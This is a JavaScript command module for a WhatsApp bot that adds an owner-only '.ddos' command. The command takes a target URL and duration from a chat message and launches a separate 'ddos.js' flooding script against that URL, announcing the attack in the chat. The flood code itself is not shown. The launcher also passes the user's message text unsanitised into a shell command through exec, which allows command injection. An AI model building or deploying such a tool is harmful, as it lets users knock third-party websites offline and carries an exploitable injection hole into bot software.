// CREDIT: DGXEON, KING SAM
const { exec } = require("child_process");
const path = require("path");

module.exports = {
  command: ["ddos"],
  description: "Start a DDoS ;-).",
  isOwner: true,
  isSudo: true,

  async run({ sock, msg, from, text }) {
    if (!text.includes("http") || text.includes("ayokunle-restapi")) {
      return sock.sendMessage(from, { text: `⚠️ Please provide a valid URL.\n\nExample:\n.ddos https://example.com 60` }, { quoted: {
            key: {
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: from
            },
            message: {
              conversation: "⚔️ DDOS ATTACK "
            }
          } });
    }

    const [url, duration] = text.split(" ");
    const time = parseInt(duration) || 60;

    const ddosScriptPath = path.join(__dirname, "../ddos.js");

    sock.sendMessage(from, { text: `Starting ddos attack on: ${url}\nTime: ${time} seconds...` }, { quoted: {
            key: {
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: from
            },
            message: {
              conversation: "⚔️ DDOS ATTACK "
            }
          } });

    exec(`node "${ddosScriptPath}" "${url}" "${time}"`, (error, stdout, stderr) => {
      if (error) {
        console.error("❌ DDoS Error:", error);
        return sock.sendMessage(from, { text: `❌ Failed to start ddos:\n${error.message}` }, { quoted: msg });
      }

      const response = stdout || "✅ Attack started.";
      sock.sendMessage(from, { text: `Result:\n${response}` }, { quoted: msg });
    });
  }
};